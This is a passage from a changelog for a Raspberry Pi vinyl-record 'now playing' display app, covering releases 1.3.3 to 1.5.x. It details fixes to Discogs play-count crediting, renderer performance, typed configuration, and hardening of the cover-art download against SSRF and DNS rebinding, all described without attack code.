  which capped the backoff at 10s as an interim mitigation). `DiscogsHttp` now
  owns a bounded `ThreadPoolExecutor(max_workers=2, thread_name_prefix="discogs")`
  and an async `run()` helper; the reader and writer expose thin `run()`
  delegates, and the resolver's collection/database searches and the tracker's
  Play Count / Last Played writes dispatch through them. Cover art and Last.fm
  deliberately STAY on the default pool. The composition root passes the shared
  `DiscogsHttp` to `run_pipeline`, whose shutdown `finally` closes the executor
  LAST — after the in-flight credit writes have drained off it (`wait=False`, so
  it never hangs shutdown). Re-rated MEDIUM and pulled into Wave 1 because the
  429 path has data-integrity consequences (META-1 / META-10); actually waiting
  out a long `Retry-After` (raising the now-unjustified 10s cap) is a follow-up
  this isolation *enables*, not part of it, and the broader own-all-executors /
  shutdown-deadline work stays scoped to CRIT-3 (Wave 2). RED-first; all four
  dispatch sites, the dedicated-pool selection, the thread prefix, and the
  drain→close ordering are mutation-pinned; cold review SPEC / QUALITY PASS.
- **An album-split finalize no longer loses the previous record's Play Count
  credit on a transient write failure (#163 — MEDIUM).** `_finalize_session`
  latched `credited = True` BEFORE the increment await (a deliberate B-8
  double-increment guard) while the session was already detached — so if the
  Discogs write failed (a transient 500 / 429 / network drop, which
  `increment_play_count` catches and returns False), the completed play was
  marked credited, detached, and never retried. Reproduced RED-first: a fast swap
  to a new record before the silence threshold triggers the album split, which
  finalizes the previous session; the increment returns False and its play is
  silently lost. `PlaySession` now separates the "in-flight" latch (`crediting` /
  `loving`, set BEFORE the await to preserve the B-8 / B-23 re-entrancy guard)
  from the "committed" flag (`credited` / `loved`, set only AFTER the write
  lands), and the increment and the Last.fm love are each bounded-retried
  (3 attempts, 1s + 2s backoff — short so it fits the shutdown drain window and
  keeps the album-split lock-hold small). `update_last_played` stays a single
  attempt: it never had the false-latch bug (it always ran exactly once), it is
  self-correcting on the next play (META-7), and retrying it would fight the
  STAB-2 deliberate clock-skip. RED-first; commit-on-success, both in-flight
  guards, the retry bound, and early-return-on-success are mutation-pinned; cold
  review SPEC / QUALITY PASS (one LOW liveness note — the split-path retry runs
  under the lifecycle lock, structurally resolved by finalizing outside it,
  CONC-2 / #96 — documented, not data loss).

---

## [1.5.1] — 2026-06-19

**Code-review hardening, round 2 — no new user-facing features.** A second-pass
Principal-Engineer review (`CODE_REVIEW_2026-06-18.md`) produced 13 issues
(#62–#74) across five milestones, all fixed here through the same implement →
test → mutation-check → cold-review discipline. Highlights: the residual
cover-fetch DNS-rebinding SSRF is closed with an IP-pinned HTTPS fetch; the
cover fetch/disk cache is extracted into a pure `CoverArtCache` module with disk
hygiene; palette extraction and boot-arc rotation moved off / cached on the hot
path; five pipeline-correctness fixes; and two doc-vs-code gaps reconciled. The
test suite grew 545 → 632. No behavioral regressions; the one deferred follow-up
is #61 (dedicated Discogs executor), gated on real-world rate-limit evidence.

### Security

- **Cover-art fetch pins the connection to a validated IP (S-7, #62).** The
  download path previously resolved the host once to vet it, then let
  `requests` resolve it again to connect — a check-then-use (TOCTOU) window an
  attacker controlling DNS for an allow-listed host could exploit to rebind the
  second lookup to an internal address. `_validate_cover_url` now resolves each
  hop **exactly once** and returns the pinned IP; `_open_cover_stream` dials that
  exact IP via a `urllib3.HTTPSConnectionPool` while keeping TLS SNI +
  certificate verification bound to the original hostname (`server_hostname` /
  `assert_hostname`). The whole hop is rejected if **any** resolved address is
  non-public, IPv4-mapped IPv6 is normalized before classification, and
  multicast/reserved/unspecified space is now rejected (plugging an
  `is_global`-only gap where `224/4` slipped through). Redirects are
  re-validated and re-pinned per hop. The renderer no longer imports `requests`;
  `urllib3>=2.0` and `certifi` are now explicit direct dependencies.
  Mutation-audited; suite grew to ~562.

### Changed (architecture)

- **Cover-art fetch + disk cache extracted into `CoverArtCache` (A-15, #63).**
  The SSRF-hardened download, URL→disk caching, and the new disk-hygiene logic
  moved out of the 1,600-line `renderer.py` into a new, pygame-free
  `src/display/cover_cache.py` — the same God-object split A-4 did to the Discogs
  client, so the security-sensitive network boundary is now isolated and
  independently testable. The renderer holds a `CoverArtCache` and only asks it
  for paths / triggers downloads; it no longer imports `socket`, `ipaddress`,
  `urllib3`, `certifi`, or `tempfile`. It keeps the scaled-Surface cache and the
  palette transition (render-loop concerns). No behavioral change. Cover-fetch
  tests moved to `tests/test_cover_cache.py`.

### Fixed (resource hygiene)

- **Stale `.cover-*.part` tempfiles are swept on startup (R-1, #64).** A SIGKILL
  between a cover's tempfile write and its atomic rename used to strand a partial
  that nothing ever cleaned up; `CoverArtCache` now sweeps them on construction.
- **The on-disk cover cache is now bounded (R-2, #65).** Every in-memory cache
  was already bounded, but the cover directory grew without limit for the life of
  the collection. It's now an mtime-LRU cache capped by file count and total
  bytes, pruned on startup and after each download — and the prune never evicts
  the cover just written (guards an mtime-tie / coarse-SD-clock eviction race).

### Changed (performance — long-run stability)

- **Palette extraction moved off the event loop (P-9, #66).** `_queue_palette`
  runs synchronously inside `PlayerState.set_track`'s observer callback on the
  event loop, and used to decode the cover with Pillow inline (tens of ms on the
  Pi) on a cache miss — violating the Signal "listeners must not block" contract.
  It now never decodes: it targets the fallback palette on a miss, while a new
  `_extract_palette_async` decodes in an executor and re-queues the real palette.
  A "wanted cover" guard ensures a slow decode for a previous track can't paint
  its palette over the track now on screen. _Minor visible trade:_ a cover whose
  palette isn't yet in the in-memory cache (e.g. the first track after boot) now
  lerps fallback→album over one executor hop instead of appearing fully themed on
  the first frame — which is the same fallback→album transition the empty-state
  screens already use; repeat albums within a session stay instant via the cache.
- **Boot-arc rotation is cached by angle bucket (P-10, #67).** The identifying
  spinner used to call `pygame.transform.rotate` every frame for the whole
  (possibly minute-plus) wait; it now quantizes to 24 angle buckets and reuses a
  cached rotated Surface per `(radius, accent, bucket)`, mirroring the status
  dot's pulse buckets (P-3). Steady-state optimization; during the ≤1s palette
  lerp it falls back to per-frame rotation (never worse than before).

### Fixed (pipeline correctness)

- **Scrobble re-checks the session epoch before firing (B-19, #68).** Scrobbling
  still happens on confirmation (a confirmed vinyl track is genuinely playing),
  but `TrackCommitService.commit` now re-checks `session_epoch` before the
  scrobble — `on_track_identified` can yield (its album-split path awaits a
  Discogs write), and a needle-lift during that window must not scrobble a track
  whose session has already ended. The display commit, which has no intervening
  await, is unaffected.
- **Recognition-churn telemetry (B-21, #70).** When recognition keeps returning
  different one-off matches that never reach confirmation (two records bleeding,
  a noisy room), the display correctly doesn't guess — but it used to do so
  silently. A churn counter now logs a warning every few unconfirmable results so
  a "stopped updating" report has a journal breadcrumb. No change to the
  conservative consecutive-confirmation behavior.
- **Static-frame cache key no longer keys on `id(cover)` (B-22, #71).** Python
  object ids are recycled after GC, so a freshly-loaded cover Surface could
  reuse a collected one's id and falsely match a stale composed frame. The key
  now includes a monotonic `_cover_version` bumped whenever a cover lands, so a
  newly-downloaded cover reliably forces a recompose.
- **Last.fm love can't double-fire (B-23, #72).** `PlaySession` gains a `loved`
  flag (latched before the love await), mirroring the `credited` guard. Needed
  because a fallback album (no release_id) never latches `credited`, so the
  existing guard didn't cover the love path; a re-entrant finalize could
  otherwise love the closer twice.

### Documented (no behavior change)

- **Lock-free session start proven race-free (B-20, #69).** Analysis showed the
  synchronous `_start_session` called from `on_silence_event(MUSIC_STARTED)` is
  not a reproducible race on the single-threaded event loop (create-only,
  idempotent, no await; the session-destroy site has no await before the null;
  the one lock-held-across-await path adopts rather than clobbers). The invariant
  is now documented in `_start_session` and locked down by a regression test,
  rather than restructured (routing the sync start through the lock would need
  scheduling, breaking the synchronous-session contract and adding a
  SESSION_ENDED ordering hazard for no real safety gain).

### Documented / tests (aspirational debt)

- **Hue-Diversity Rule deliberately deferred, docs reconciled (D-1, #73).** The
  ≥60° OKLCH cross-album accent separation was a prototype-only design
  exploration the docs still framed as "aspirational / not yet implemented"
  (implying pending). It is now recorded as **deliberately deferred — not a
  production feature**: the production `accent` stays the authentic
  most-saturated cover color, in isolation. Implementing it would make the accent
  a synthetic color not in the artwork and the palette order-dependent (breaking
  the pure `url → palette` cache); revisit only if same-hue runs prove
  distracting on hardware. CLAUDE.md and DESIGN.md updated to match the shipped
  code; no code change.
- **Resolution-independence of the static layout backed by a test matrix
  (D-2, #74).** CLAUDE.md claims the renderer is resolution-independent
  (`s = min(w/1024, h/600)`, no breakpoints), but `get_now_playing_layout` was
  only ever exercised near 1024×600. A new parametrized matrix — 480×320 → 4K
  **plus non-16:9 cases (square, portrait, ultra-wide, 5:4)** that exercise the
  `sx ≠ sy` / min-dimension cover branch — asserts no negative/zero/off-screen
  rects, a square cover bound by the smaller dimension and clear of the text
  column, correct vertical flow with the title block clear of the bottom
  meta/prev-next, and font floors + hierarchy at every size. The static layout
  held across the whole matrix. _Scope:_ this covers the deterministic layout
  geometry; the renderer's runtime text-fit composition (`_compose_now_playing`'s
  dynamic title push-down/clip) is content-dependent and remains unexercised by
  these pure-geometry tests.

---

## [1.5.0] — 2026-06-19

**Code-review hardening release — no new user-facing features.** A full
Principal-Engineer review of the codebase (`CODE_REVIEW_2026-06-17.md`) produced
59 findings across six milestones — architecture, performance, correctness,
security, tests, and the design prototype — all fixed here. Every fix shipped
through the same discipline: implement → tests → mutation checks → independent
cold review. No behavioral regressions; the test suite grew to ~545 and is
mutation-audited.

> **Upgrade note:** `config.yaml` is now parsed into a typed, validated config
> at startup (see _Changed_ below). Validation is **stricter** than the old
> untyped load — a hand-edited config with loose types (e.g. `fullscreen: 1`,
> `sample_rate: 44100.0`, or a quoted number like `width: "1024"`) that used to
> run will now fail fast with one aggregated, human-readable `ConfigError`.
> The shipped `config.example.yaml` uses correct types; check yours if it was
> edited by hand.

### Changed (architecture)

- **Typed configuration boundary (A-2).** New `src/config.py`: `load_config()`
  parses + validates `config.yaml` **once** into a frozen `AppConfig` tree of
  section dataclasses (`AudioConfig`, `DiscogsConfig`, `DisplayConfig`,
  `LastFmConfig`, `RecognitionConfig`). Every component now takes its own typed
  slice instead of reaching into an untyped dict, and a missing/misspelled key
  is one friendly `ConfigError` at startup rather than a deep `KeyError`.
- **`DiscogsClient` God object split into a package (A-4).** `src/metadata/discogs/`
  now holds three single-purpose collaborators: `DiscogsHttp` (`transport.py` —
  the shared authenticated session + rate-limit-aware `request()`), `DiscogsReader`
  (`reader.py` — collection/database search, tracklist, original-year,
  result assembly), and `DiscogsCollectionWriter` (`writer.py` — Play Count and
  Last Played writes). `main.py` is the composition root: one shared transport,
  reader → resolver, writer → tracker — each depends only on the half it uses.
  The old `src/metadata/discogs_client.py` is removed.
- **Application-layer commit coordinator (A-9).** The resolve → state → track →
  scrobble sequence moved out of the audio layer into
  `src/app/track_commit_service.py` (`TrackCommitService.commit`). `RecognitionLoop`
  now simply confirms a `RawRecognitionResult` and hands it to an injected
  `on_confirmed` callback; it no longer knows about the resolver, tracker, or
  Last.fm. The B-1 epoch guard and B-11 ordering are preserved exactly.
- **Thin `TrackMetadata` + `SideIndex` value object (A-5).** All positional facts
  (track number, side letter/position/total, prev/next, is-last-track) are now
  computed once by `SideIndex.from_tracklist(...)` and cached, instead of each
  property re-scanning the tracklist by title on every access.
- **Palette extraction relocated (A-8).** Cover-art palette extraction and the
  WCAG colour science (`extract_palette`, `ensure_contrast`, `contrast_ratio`,
  `relative_luminance`, `validate_image_file`) moved from the pygame renderer to
  `src/display/palette.py`; the renderer now consumes already-valid palettes.
  `extract_palette` guarantees the Full-Opacity Rule (muted ≥ 4.5:1) by
  construction.
- **Enum-driven empty states (A-7).** Boot/idle/error rendering is now an
  `EmptyState` enum + a single `_EMPTY_STATES` descriptor table, replacing the
  stringly-typed `kind` argument and three parallel dicts.
- **Observer hardening (A-11/A-12).** New `src/util/signal.py` `Signal[T]` with
  log-and-continue delivery (a throwing listener can't kill delivery to the
  rest); `PlayerState` and `SilenceDetector` use it. `PlayerState` is documented
  as event-loop-thread-only.
- **Error taxonomy (A-6).** New `src/metadata/errors.py` distinguishes transient
  vs. permanent external failures (`is_transient`); the resolve boundary treats a
  transient miss as "couldn't determine" (leave the album uncached/retryable)
  rather than a false "not owned".
- **Recognition backend split (A-13).** `RecognitionLoop` recognition is split
  into `_encode_wav` (executor) / `_call_shazam` (transport, lazy import) / a
  pure `_parse_shazam` for testability.
- **Decoupling (A-3).** The tracker is injected with its Discogs dependency
  directly at the composition root rather than reaching into the resolver's
  internals (later narrowed to the write half by A-4).

### Performance

- **Session collection index (P-1).** Discogs collection search builds an
  in-memory index once per session and matches locally, replacing up to 25
  per-candidate membership GETs and a full re-walk.
- **Rate-limit back-off cap lowered 30s → 10s (P-2).** Bounds how long a 429
  back-off can park a shared executor worker. (Full isolation via a dedicated
  Discogs thread pool is deferred — tracked in #61.)
- **Renderer hot-loop caching (P-3…P-8).** Pre-rendered status-dot phases,
  quantized in-flight lerp palettes for stable per-frame cache keys, a bounded
  font cache, numpy-based palette frequency counting (also retiring the
  deprecated `Image.getdata()`), and other per-frame allocation removals.

### Fixed (correctness)

- **Play-count integrity (B-1, B-2).** A track can no longer resurrect itself
  after the needle lifts (session-epoch guard around the resolve await), and a
  fast side/record swap no longer credits the wrong album.
- **Tracklist / neighbour correctness (B-5, B-10).** Reprise titles repeated
  across sides resolve to the correct neighbour, and numbered tracklists (no
  side letter) now get prev/next.
- **Discogs robustness (B-15, B-16).** A 429 on a POST no longer blindly retries
  unless the body is an idempotent absolute-set; a numeric Play Count value is
  coerced instead of silently skipped.
- **Renderer robustness (B-12, B-17, B-18).** Degenerate covers don't crash
  palette extraction, the genre "+N" overflow reflects what actually fit, and a
  corrupt cached cover is re-fetched within the track.
- Plus the remaining correctness findings (B-7, B-9, B-11, B-14, etc.).

### Security

- Cover-art download SSRF hardening, decompression-bomb guards, write-URL ID
  coercion (S-5), and request-URL redaction in logs (S-4) (S-1…S-5).

### Tests & docs

- New suites for the new structure: `test_config.py`, `test_track_commit_service.py`,
  the Discogs `reader`/`writer`/`transport`/`security`/`split` tests, plus run-loop,
  capture drop-oldest/stop, and tracker public-path coverage. The Last.fm scrobble
  branch and `RecognitionLoop.run()` are now exercised (T-2). Async tests are
  marker-consistent and a flaky palette-retarget assertion is deterministic.
- Hardcoded test counts in docs are de-hardcoded (T-8) — run
  `pytest --collect-only -q | tail -1` for the live number.
- The manual `test_discogs_live.py` script is gated out of pytest collection (T-7).

### Design prototype

- Wired the "Show prev/next" tweak toggle and removed dead `primaryAlbumId`
  (PR-1); replaced the module-load `matchMedia` read with a live
  `useReducedMotion()` hook (PR-3); dropped a dead `transformOrigin` and
  annotated the sanctioned wildcard `postMessage` bridge (PR-5); added handoff
  notes that empty-state metadata suppression and palette guarantees come from
  `DESIGN.md` / production code, not the hand-tuned prototype (PR-2, PR-4).

---

## [1.4.2] — 2026-06-11

**Behavior-refinement release — original year over pressing year.** The
catalog footer's year now shows the album's original release year rather
than the pressing's. Surfaced by rendering the 2026 pink-vinyl reissue of
Wolf Parade's *Apologies to the Queen Mary* (2005): the display read 2026.
DESIGN.md §7 already specified "original release year" — this is the code
catching up to the spec. Test count: 334 → 341.

### Changed

- `DiscogsClient._build_result` now prefers the new
  `get_original_year()` — a rate-limited GET to `/masters/{id}` reading the
  master's year — and falls back to `release.year` (the pressing year) when
  the release has no master, the master's year is 0/unknown, or the lookup
  fails. Both Discogs tiers benefit; the MusicBrainz fallback still shows
  no year (unchanged).
- Cost: one extra Discogs API call per album resolve, amortized by the
  v1.3.3 album-level metadata cache to once per album per session, and
  routed through the v1.3.3 429-aware `_request` helper.

### Tests

- 341-test unit suite (+7 in `tests/test_discogs_client.py`):
  master-year preferred over pressing year, no-master and zero-year and
  network-failure fallbacks, lazy `.master` property raising, and
  `_build_result` end-to-end preference/fallback.

---

## [1.4.1] — 2026-06-11

**Empty states release — Phase 2, completing the v1.4.0 design
translation.** Boot, idle, and the new error state now render in the full
DirectionA frame per DESIGN.md §5, replacing the interim centered spinner
and bare gradient. Test count: 314 → 334.

### Added

- **`PlayerStatus.ERROR`** — set by `RecognitionLoop._register_miss()` after
  `recognition.error_after_misses` consecutive failed recognitions (default
  6, ≈1 minute) while LISTENING. Misses during PLAYING (routine surface
  noise) and IDLE never trigger it. Recovery: repositioning the needle
  (music restart re-enters LISTENING) or a successful commit (→ PLAYING);
  session end clears to IDLE.
- **Error screen** — static muted-red arc (`#c85050`) in the ghost ring,
  "NO MATCH FOUND" + "REPOSITION NEEDLE TO RETRY" labels, hero "Couldn't
  identify". Deliberately motionless: boot spins, error sits.
- **Boot screen** (replaces the centered spinner) — full DirectionA frame
  with ghost ring + rotating accent arc (1.4s linear, per the design's
  rotate keyframe), hero "Listening…" at 48px, and the time-progressive
  cover label: WARMING UP (0–19s) → STILL LISTENING… (20–59s) →
  IDENTIFYING… M:SS (60s+), so a hung process is distinguishable from
  active identification across the room.
- **Idle screen** (replaces the bare gradient) — 135° diagonal-stripe
  empty cover (12px surface/bg bands) with "NO RECORD ON PLATTER", hero
  "Waiting for a record". Still the minimal DESIGN.md placeholder; the
  rich idle redesign remains planned (now v1.6.0).
- New `recognition.error_after_misses` config key (default 6).

### Changed

- All empty states render on the fallback palette (lerped to smoothly from
  the last album's palette rather than jump-cutting), suppress all album
  metadata (artist, album, chips, catalog, PREV/NEXT — per DESIGN.md
  production behavior), keep the Cover Lift shadow, and show the status
  strip with state-mapped dot: boot pulses + glows in accent; idle sits
  static in muted; error sits static in red. The hero renders at 48px (the
  DESIGN.md empty-state font size exception) above the accent rule.
- `MUSIC_STARTED` now re-enters LISTENING from ERROR as well as IDLE
  (`main.py`) — the "reposition needle" recovery path.
- `_draw_header` and `_draw_status_dot` generalized (state label / dot
  color, animation, and glow are now parameters shared by the now-playing
  and empty screens).
- Idle and error frames are fully static, so the render loop goes quiet in
  those states (previously the idle screen still woke at 10 fps).

### Tests

- 334-test unit suite (+20 in `tests/test_error_state.py`): ERROR
  transitions and recovery, miss-counting rules across all states, boot
  label progression, headless compose smoke tests for all three empty
  states, and static-frame cache behavior across boot-label ticks.

---

## [1.4.0] — 2026-06-11

**Design fidelity release — Phase 1 of the DESIGN.md production
translation.** Brings the production renderer up to the full design system
spec (typography, elevation, components) defined in `DESIGN.md` and
`design/DirectionA.jsx`, plus a major render-loop optimization. Phase 2
(empty-state redesign + error state) follows separately. Test count:
297 → 314.

> **Versioning note:** the roadmap previously reserved v1.4.0 for the idle
> screen redesign; planned features then shifted up one minor version. (Further
> superseded by the v1.5.0 code-review hardening release — current plan is idle
> screen → v1.6.0, side awareness → v1.7.0, web dashboard → v1.8.0; see
> `docs/roadmap.md`.)

### Added

- **Bundled display fonts** (`src/display/assets/fonts/`, all OFL-licensed
  with license texts included): Inter Tight SemiBold (hero track), Inter
  Tight Medium (artist, adjacent track names), Newsreader Italic (album
  title), JetBrains Mono Regular (all labels/metadata). Static instances
  cut from the Google Fonts variable sources. DejaVu SysFont fallback if
  files are missing.
- **Letter-spacing for mono labels** (`_render_tracked`): SDL_ttf has no
  tracking support, so labels render per-character with CSS-equivalent em
  tracking (0.16em status strip, 0.10em chips, 0.08em catalog footer,
  0.12em PREV/NEXT). Surfaces cached in a `_BoundedCache` (cap 128).
- **Cover Lift shadow + hairline ring** (DESIGN.md §4): the design's
  defining `0 30px 60px rgba(0,0,0,0.55)` shadow, rendered via Pillow
  gaussian blur (cached per size), plus the 1px ~4%-white inset ring that
  keeps the cover edge visible against near-black backgrounds.
- **Shrink-instead-of-ellipsis everywhere** (product decision): artist
  (single line) and album (≤2 wrapped lines, per the design's 2-line clamp)
  now step their font size down via the new `_fit_wrapped()` helper instead
  of hard-clipping. The hero keeps its v1.2.1 step-down behavior. Ellipsis
  survives in exactly one sanctioned place: PREV/NEXT adjacent track names
  (`_ellipsize`).
- **Muted-role contrast clamp** (DESIGN.md Full-Opacity Rule): extracted
  `muted` colors are lightened at extraction time until they pass WCAG
  4.5:1 against their album's `bg` (`_ensure_contrast`; cool-dark covers
  like Cavetown's `#0e1a2a` were the hazard case).
- **`display.reduced_motion` config flag**: freezes the status dot pulse
  and the listening spinner — the renderer's translation of the design's
  `prefers-reduced-motion` requirement (pygame has no OS media query).
  Bonus: at steady state with the flag on, the render loop goes fully quiet.

### Changed

- **Status strip** now sits on a solid `surface` background (DESIGN.md §5)
  instead of floating on the gradient; labels are letter-spaced mono.
- **Status dot** follows the spec pulse — opacity 1→0.55 / scale 1→0.9,
  1.6s eased loop with an accent glow halo — replacing the old binary
  on/off color flip every 0.8s.
- **Genre chips** restyled per DESIGN.md §5: transparent background, 1px
  border in accent at ~33% alpha (the JSX `{accent}55`), tracked muted
  text — and capped at 3 chips with a `+N` overflow indicator
  (`_chip_texts`), replacing unlimited rows.
- **Album title** renders in Newsreader Italic at line-height 1.12 and may
  wrap to two lines (previously one hard-clipped DejaVu italic line).
- **PREV/NEXT panel** matches the design: 1px top divider, NEXT column
  right-aligned to the metadata column's right edge, names in Inter Tight
  Medium. The divider deviates from the spec's pure `surface` by blending
  40% toward `muted` — pure surface was invisible on the physical display
  at room distance (product decision).
- **Catalog footer** uses tracked JetBrains Mono.

### Performance

- **Static-frame cache:** the full now-playing frame (gradient, shadow,
  cover, ring, strip, all text) is composed once per (track content,
  palette) onto an offscreen Surface; steady-state frames are one blit plus
  the animated dot, instead of re-rendering every element at 10 fps.
- **Layout computed once** at startup (`self._layout`) instead of once per
  frame (`get_now_playing_layout` was called inside the render hot path).
- **Shared wrap algorithm:** `_wrap_lines()` is now the single source of
  truth for word-wrapping — `_draw_wrapped_text` and `_measure_wrapped_text`
  previously carried duplicate copies that could drift.

### Removed

- `_build_font_cache()` and the four startup font dicts (`_fonts`,
  `_italic_fonts`, `_mono_fonts`, `_bold_fonts`), replaced by the lazy
  role-based `_font()` cache. `_draw_text_clipped()` and `_draw_mono_text()`
  superseded by shrink-to-fit drawing and tracked labels.

### Tests

- 314-test unit suite (+17 in `tests/test_renderer_typography.py`):
  wrap/fit/ellipsize behavior, chip capping, WCAG contrast math and clamp,
  and a full headless `_compose_now_playing` smoke test under SDL's dummy
  video driver.

---

## [1.3.5] — 2026-06-10

**Bug-fix and hardening release — the final-pass audit.** A third
full-codebase review (this time auditing the two previous sweeps' own work)
found one bug dating to v1.0.0, one blind spot in the day-old auto-split,
two robustness gaps, a queue-policy inconsistency, lint, and a cluster of
inaccurate log-string guidance in the Pi setup guide. Test count: 271 → 297,
including the first-ever tests for `capture.py`.

### Fixed

- **The ESC key (or closing the window) left the app running headless**
  (`main.py`).  `DisplayRenderer.run()` exits on ESC/QUIT, but
  `asyncio.gather` waited for ALL three pipeline legs — so capture and
  recognition kept running invisibly, still scrobbling and writing play
  counts with no screen attached, until the process was killed.  The legs
  are now named tasks awaited with
  `asyncio.wait(return_when=FIRST_COMPLETED)`: when ANY leg exits, the rest
  are cancelled and the app shuts down cleanly.  Bonus: an unexpected death
  of any single coroutine now also stops the whole app instead of leaving it
  limping.  Present since v1.0.0; survived two prior review sweeps.

- **The v1.3.4 album-change auto-split missed DB-resolved first records**
  (`src/metadata/models.py`, `src/tracking/listen_tracker.py`).  The split
  compared against the LATCHED `album_release_id`, which only
  collection-owned tracks set.  Sequence: record 1 resolves via the Discogs
  database tier (no latch), its closer plays, record 2 (collection-owned) is
  dropped within 45s → no difference detected → sessions merge → record 2
  latches and is phantom-credited with record 1's completed play at session
  end.  `PlaySession` now tracks `last_release_id` — updated from ANY source
  carrying a release ID — and the split compares against that.  Regression
  tests cover both swap directions.

### Changed

- **Recognition queue now drops the oldest chunk, not the newest**
  (`src/audio/recognizer.py`).  When Shazam lags and the 5-chunk queue
  fills, the incoming chunk used to be discarded while stale audio kept
  being processed first — delaying track-change detection.  The OLDEST
  queued chunk is now evicted instead, matching AudioCapture's block-queue
  policy: recent audio wins.

- **Palette transitions skip when the target is unchanged**
  (`src/display/renderer.py`).  Every track commit notifies the renderer,
  and tracks from the same album share a cover — so each commit restarted
  the 1s palette transition (30 fps cadence + per-frame gradient
  regeneration) lerping a palette to itself.  `_queue_palette()` now returns
  early when the computed target equals the current one.

- **Fractional seconds in config no longer crash capture**
  (`src/audio/capture.py`, `src/audio/chunking.py`).  `chunk_seconds: 7.5`
  previously passed validation and died mid-capture with
  `TypeError: slice indices must be integers` deep in numpy.  Capture now
  coerces frame math to int, and `ChunkAssembler` rejects fractional frame
  counts with a clear message (whole-valued floats are accepted and
  coerced).

- **Lint sweep** — removed every pyflakes-flagged unused import: `Optional`
  in `resolver.py` and `lastfm_client.py`, a vestigial `import pylast`
  inside `love()`, `MetadataSource` in `listen_tracker.py`, three
  method-level `import pygame` statements in renderer methods that no longer
  touch pygame, and stray `pytest`/`call`/`asyncio`/`patch` imports across
  five test files.  The tree is now pyflakes-clean.

### Documentation

- **`docs/pi-setup-guide.md` first-run guidance corrected** — the
  watch-the-logs list told users to look for strings that don't exist
  (`Committed track:`, `RawRecognitionResult`), are DEBUG-only and invisible
  at the default INFO level (`MUSIC_STARTED`, `Found in collection`), or are
  worded wrong (`✅ Scrobbled to Last.fm:` vs the actual
  `Last.fm scrobbled:`).  Rewritten to the real INFO-level lines in the
  order they appear, with a note on enabling DEBUG.  The step-11 timing
  ("within 30–60 seconds") also still reflected the pre-v1.3.3 capture
  gap; corrected to ~25–40s.

### Added

- **`tests/test_capture.py`** (10 tests) — first-ever coverage for
  `capture.py`, made possible by stubbing `sounddevice` into `sys.modules`
  before import (the real module needs PortAudio at import time): device
  matching (substring, case-insensitivity, input-channel filtering,
  multi-match warning, not-found error with available-device list), the
  overlap-misconfiguration guard, and config plumbing.
- **`tests/test_renderer_palette.py`** (6 tests) — headless `_queue_palette`
  coverage: disabled theming, fallback paths, cache hits, the v1.3.5
  same-target skip, and genuine retargets.
- **`tests/test_listen_tracker.py`** (+2), **`tests/test_models.py`** (+3),
  **`tests/test_chunking.py`** (+3), **`tests/test_recognizer.py`** (+2) —
  regression tests for the split blind spot, `last_release_id` semantics,
  integral-frame validation, and the drop-oldest queue policy.

---

## [1.3.4] — 2026-06-10

**Behavior-refinement release — follow-up to the v1.3.3 deep review.** The
design observations deferred from v1.3.3 were decided and implemented: the
play-count gate now matches by tracklist position, sessions auto-split when
records are swapped quickly, side flips no longer banish the now-playing
card, and two pieces of dead code were removed. Test count: 261 → 271.

### Changed

- **`is_last_track` matches by tracklist position, not title**
  (`src/metadata/models.py`).  This property is the sole gate on Discogs
  play-count updates, and title-only matching let any earlier track sharing
  the closer's title (title-track reprises, live sets) set
  `potential_last_track` from side A — a phantom play count if the session
  ended there.  The current entry's position string is now compared to the
  final entry's.  Deliberately conservative residual behavior: an album
  whose GENUINE closer duplicates an earlier title resolves to the first
  occurrence and returns False (a missed count, never a phantom one).

- **Sessions auto-split on mid-session album changes**
  (`src/tracking/listen_tracker.py`).  Swapping records faster than
  `session_end_silence_seconds` (45s) used to merge two albums into one
  `PlaySession` — the release ID stayed latched from record 1, so record
  2's closer could credit record 1 with a play.  `on_track_identified` now
  ends the current session when a confirmed track's `discogs_release_id`
  differs from the latched one (correctly crediting record 1 if its closer
  played) and starts a fresh session.  Reliable because the v1.3.3 album
  cache guarantees consistent release IDs per album within a session;
  FALLBACK tracks (no release ID) never trigger a split.

- **The now-playing card stays up during side flips** (`main.py`).
  `MUSIC_STARTED` now transitions to LISTENING only from IDLE.  Previously
  a side flip dropped the display to the IDENTIFYING spinner for ~25s while
  the first track of side B confirmed; the card now stays on screen showing
  side A's last track and updates in place on the next commit.  Fresh
  sessions (from IDLE) still show the spinner.

### Removed

- **`PlayerStatus.SESSION_ENDED`** (`src/state/player_state.py`,
  `src/display/renderer.py`).  Defined since v1.0.0 but never set by any
  code path — `AudioEvent.SESSION_ENDED` (a different concept) leads to
  `clear()`, which transitions directly to IDLE.  Removed from the enum and
  from the renderer's dispatch; a docstring note explains the history.

- **`ListenTracker.__init__`'s unused `config` parameter**
  (`src/tracking/listen_tracker.py`).  The tracker reads everything it
  needs from the resolver's DiscogsClient.  Call sites in `main.py` and the
  test helpers updated.

### Added

- **`tests/test_listen_tracker.py`** (+6 tests) — album-change auto-split:
  splits on differing release IDs, credits a finished record 1, does NOT
  credit an unfinished record 1, no split on same release / FALLBACK
  metadata / before anything is latched.
- **`tests/test_models.py`** (+4 tests) — position-based `is_last_track`:
  the side-A duplicate-title regression, genuine closers, title
  normalization when locating the entry, unknown titles.

---

## [1.3.3] — 2026-06-10

**Bug-fix and performance release — no new features.** A full-codebase deep
review found one real notification bug, one capture-pipeline design flaw
masquerading as a feature, a Discogs API usage pattern flirting with the rate
limit, two render-loop hot paths doing per-frame work that should have been
cached, and a handful of asyncio hygiene issues. All fixed in one pass.
Test count: 210 → 261 (three new test files plus additions to three existing
ones), including the first-ever tests for `PlayerState`.

### Fixed

- **`PlayerState.set_track()` swallowed every track change after the first**
  (`src/state/player_state.py`).  `set_track()` notified listeners only via
  `set_status(PLAYING)`, which no-ops when the status is already PLAYING —
  so for track 2 onward, `DisplayRenderer._on_state_change()` never fired,
  meaning no cover-art prefetch and no palette transition for any track whose
  cover URL differed from the previous one (fallback-sourced tracks, or
  changing records without a 45s silence gap).  `set_track()` now notifies
  exactly once on every call.  Caught by the new `test_player_state.py` —
  `PlayerState` previously had zero test coverage.

- **"Overlapping" capture chunks actually had a dead gap between them**
  (`src/audio/capture.py`, new `src/audio/chunking.py`).  The capture loop
  recorded a 15s chunk with blocking `sd.rec()`, then slept for
  `chunk_seconds - overlap_seconds` (10s) during which nothing was recorded —
  the documented 5s overlap was in reality a 10s blind spot, delaying
  music/silence transition detection by up to ~25s.  Capture now records
  continuously via `sd.InputStream`; a new pure-numpy `ChunkAssembler` emits
  a 15s window every 10s with a genuine 5s shared region between consecutive
  chunks.  No audio is ever dropped between windows.  Fully unit-tested
  without hardware (`tests/test_chunking.py`).

- **Ctrl+C produced a RuntimeError traceback on every shutdown** (`main.py`).
